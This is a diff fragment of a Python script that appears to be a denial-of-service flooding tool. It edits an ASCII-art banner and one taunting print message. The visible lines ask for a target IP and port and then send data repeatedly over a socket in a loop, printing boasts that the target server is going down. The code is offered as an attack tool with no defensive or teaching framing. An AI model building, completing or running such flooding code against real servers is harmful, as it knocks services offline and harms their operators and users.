@@ -9,13 +9,14 @@ _▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄
 ────█░░█░░░░░█░░█────
 ─▄▄──█░░░▀█▀░░░█──▄▄─
 █░░█─▀▄░░░░░░░▄▀─█░░█
-█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-█
-█   ▀▀▀▀▀  ▀  ▀▀▀▀▀
-█      █  ▀     █
-█      █   ▀    █
-█   ▀▀▀▀▀  ▀  ▀▀▀▀▀
-█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
+█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+█   ▀▀▀▀▀▀▀   ▀  ▀▀▀▀▀▀▀  ▀
+█        ▀       ▀        ▀
+█       ▀     ▀  ▀▀▀▀▀▀▀  ▀
+█     ▀       ▀  ▀        ▀
+█   ▀▀▀▀▀▀▀   ▀  ▀▀▀▀▀▀▀  ▀▀▀▀▀
+█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
+
 ip = str(input(" IP : "))
 port = int(input(" PORT : "))
 choice = str(input(" READY MANIEZ? (y/n) : "))
@@ -44,7 +45,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" ZIEL ATTACKING TO YOUR SERVER")
+			print(i +" [-] YAHAHAHAH DOWN YA DECK")
 		except:
 			s.close()
 			print("[-] YAHAHAHAH DOWN YA DECK")
